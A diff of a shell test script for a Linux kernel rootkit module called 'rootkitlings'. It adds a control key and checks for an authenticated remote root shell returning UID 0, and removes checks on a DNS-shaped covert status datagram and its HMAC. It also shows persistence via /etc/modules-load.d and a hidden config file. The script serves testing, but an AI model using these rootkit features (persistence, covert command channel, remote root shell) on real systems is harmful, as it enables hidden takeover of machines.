@@ -4,6 +4,7 @@
 
 begin "Complete rootkit"
 
+key=000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f
 root=/etc/modules-load.d
 target=$root/rootkitlings.conf
 sibling=$root/.rootkitlings.conf.rootkitlings
@@ -11,18 +12,23 @@ status=/proc/rootkitlings_agent
 core=/proc/rootkitlings
 work=/tmp/rootkitlings-complete-rootkit
 helper=secure_agent_fixture
-capture=$work/dns-query
 redirect_capture=$work/redirected-datagram
 fixture_pid=
-listener=
 redirect_listener=
 
 cleanup()
 {
-	if test -d /sys/module/rootkitlings; then rmmod rootkitlings 2>/dev/null || true; fi
-	if test -n "$fixture_pid"; then kill "$fixture_pid" 2>/dev/null || true; wait "$fixture_pid" 2>/dev/null || true; fi
-	if test -n "$listener"; then kill "$listener" 2>/dev/null || true; wait "$listener" 2>/dev/null || true; fi
-	if test -n "$redirect_listener"; then kill "$redirect_listener" 2>/dev/null || true; wait "$redirect_listener" 2>/dev/null || true; fi
+	if test -d /sys/module/rootkitlings; then
+		rmmod rootkitlings 2>/dev/null || true
+	fi
+	if test -n "$fixture_pid"; then
+		kill "$fixture_pid" 2>/dev/null || true
+		wait "$fixture_pid" 2>/dev/null || true
+	fi
+	if test -n "$redirect_listener"; then
+		kill "$redirect_listener" 2>/dev/null || true
+		wait "$redirect_listener" 2>/dev/null || true
+	fi
 	umount "$root" 2>/dev/null || true
 }
 trap cleanup EXIT INT TERM
@@ -43,7 +49,10 @@ wait_field()
 	field=$1 minimum=$2 index=0
 	while test "$index" -lt 1000; do
 		value=$(sed -n "s/^$field=//p" "$status" 2>/dev/null)
-		if test -n "$value" && test "$value" -ge "$minimum" 2>/dev/null; then return 0; fi
+		if test -n "$value" && test "$value" -ge "$minimum" 2>/dev/null
+		then
+			return 0
+		fi
 		sleep 0.01
 		index=$((index + 1))
 	done
@@ -67,13 +76,11 @@ fi
 "$helper" reserve "$work/port"
 port=$(cat "$work/port")
 
-nc -u -l -p 5300 -s 127.0.0.1 > "$capture" 2>/dev/null &
-listener=$!
 nc -u -l -p 5401 -s 127.0.0.1 > "$redirect_capture" 2>/dev/null &
 redirect_listener=$!
 sleep 0.1
 load rootkitlings.ko "peer_port=$port" retry_base_ms=20 retry_max_ms=80 \
-	session_id=72623859790382856 signal_id=4660
+	"control_key=$key" session_id=72623859790382856 shell_timeout_ms=60000
 assert_loaded rootkitlings
 assert_exists "$status"
 if wait_field retries 2 && wait_field transport_errors 2; then
@@ -96,22 +103,40 @@ if wait_file "$work/server/tamper_rejected"; then
 else
 	_fail "mutated request was not rejected"
 fi
-wait_file "$work/server/control_complete" ||
-	_fail "authenticated resident-core commands did not complete"
+if wait_file "$work/server/control_complete"; then
+	_ok "authenticated resident commands completed"
+else
+	_fail "authenticated resident commands did not complete"
+fi
+if wait_file "$work/server/root_shell_complete"; then
+	_ok "root shell returned UID 0 and exact command output"
+else
+	_fail "root shell did not return UID 0 and command output"
+fi
+if wait_file "$work/server/shell_replay_rejected"; then
+	_ok "replayed shell request opened no connection"
+else
+	_fail "replayed shell request opened another shell"
+fi
+if wait_file "$work/server/shell_tamper_rejected"; then
+	_ok "tampered shell request opened no connection"
+else
+	_fail "tampered shell request opened a shell"
+fi
 index=0
 while test "$index" -lt 1000; do
 	actions=$(sed -n 's/^actions=//p' "$core" 2>/dev/null)
 	worker_runs=$(sed -n 's/^worker_runs=//p' "$core" 2>/dev/null)
-	if test "$actions" = disabled && test "${worker_runs:-0}" -ge 1 2>/dev/null
+	if test "$actions" = enabled && test "${worker_runs:-0}" -ge 1 2>/dev/null
 	then
 		break
 	fi
 	sleep 0.01
 	index=$((index + 1))
 done
-if test "$actions" = disabled && test "${worker_runs:-0}" -ge 1 2>/dev/null
+if test "$actions" = enabled && test "${worker_runs:-0}" -ge 1 2>/dev/null
 then
-	_ok "authenticated ENABLE, RUN, and DISABLE operated the resident core"
+	_ok "authenticated commands operated the resident core"
 else
 	_fail "remote resident-core state is wrong"
 fi
@@ -133,10 +158,15 @@ if wait_file "$work/server/quit_complete"; then
 else
 	_fail "QUIT did not close its session"
 fi
-wait_file "$work/server/blocked_receive" || _fail "final session did not reach blocked receive"
+if wait_file "$work/server/blocked_receive" &&
+		wait_file "$work/server/blocked_shell"; then
+	_ok "control and shell sockets are live before unload"
+else
+	_fail "control or shell socket did not reach its live session"
+fi
 
-if wait_field connections 4 && wait_field commands 11 &&
-		wait_field protocol_errors 3; then
+if wait_field connections 6 && wait_field commands 15 &&
+		wait_field protocol_errors 5; then
 	_ok "fixed commands and rejected envelopes updated independent counters"
 else
 	_fail "agent counters do not match exercised behavior"
@@ -154,64 +184,16 @@ else
 	_fail "boot-request transaction differs"
 fi
 
-wait_file "$capture" || _fail "DNS-shaped status signal was not captured"
-kill "$listener" 2>/dev/null || true
-wait "$listener" 2>/dev/null || true
-listener=
-if test "$(wc -c < "$capture")" -eq 116; then
-	_ok "captured one exact 116-byte status datagram"
-else
-	_fail "status datagram length is wrong"
-fi
-header=$(dd if="$capture" bs=1 count=12 2>/dev/null | xxd -p)
-body=$(dd if="$capture" bs=1 skip=17 count=40 2>/dev/null)
-tag=$(dd if="$capture" bs=1 skip=58 count=32 2>/dev/null)
-tail=$(dd if="$capture" bs=1 skip=90 count=26 2>/dev/null | xxd -p)
-if test "$header" = 123401000001000000000000; then
-	_ok "independent decoder found one TXT query"
-else
-	_fail "DNS header differs"
-fi
-if test "$body" = 0101010203040506070800000000000000010200; then
-	_ok "visible session, sequence, and ready status decoded"
-else
-	_fail "authenticated status body differs"
-fi
-if test "$tail" = 0c726f6f746b69746c696e6773076578616d706c650000100001; then
-	_ok "reserved suffix and TXT/IN question decoded"
-else
-	_fail "DNS question differs"
-fi
-
-key_hex=a0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebf
-inner_pad=''
-outer_pad=''
-index=0
-while test "$index" -lt 64; do
-	position=$((index * 2))
-	if test "$position" -lt "${#key_hex}"; then
-		start=$((position + 1)); end=$((position + 2))
-		byte=$(printf %s "$key_hex" | cut -c "$start-$end")
-	else byte=00; fi
-	inner_pad="$inner_pad$(printf '%02x' $((0x$byte ^ 0x36)))"
-	outer_pad="$outer_pad$(printf '%02x' $((0x$byte ^ 0x5c)))"
-	index=$((index + 1))
-done
-inner=$({ printf %s "$inner_pad" | xxd -r -p; printf %s "$body" | xxd -r -p; } | sha256sum | cut -d ' ' -f 1)
-expected=$({ printf %s "$outer_pad" | xxd -r -p; printf %s "$inner" | xxd -r -p; } | sha256sum | cut -c 1-32)
-if test "$tag" = "$expected"; then
-	_ok "independent HMAC verified the status"
-else
-	_fail "status tag failed verification"
-fi
-
 unload rootkitlings
 if wait_file "$work/server/eof"; then
-	_ok "unload cancelled blocked receive and released the socket"
+	_ok "unload cancelled agent receive and the live root shell"
 else
-	_fail "blocked receive remained owned"
+	_fail "agent receive or root shell remained owned"
 fi
-wait "$fixture_pid" || _fail "secure peer fixture failed"
+if ! wait "$fixture_pid"; then
+	cat "$work/server.log"
+	_fail "secure peer fixture failed"
+fi
 fixture_pid=
 assert_absent "$status"
 assert_absent /proc/rootkitlings
@@ -225,7 +207,9 @@ fi
 workers=0
 for comm in /proc/[0-9]*/comm; do
 	test -r "$comm" || continue
-	case $(cat "$comm") in rkling_core|rkling_agent) workers=$((workers + 1)) ;; esac
+	case $(cat "$comm") in
+		rkling_core|rkling_agent) workers=$((workers + 1)) ;;
+	esac
 done
 if test "$workers" -eq 0; then
 	_ok "unload left no resident worker"
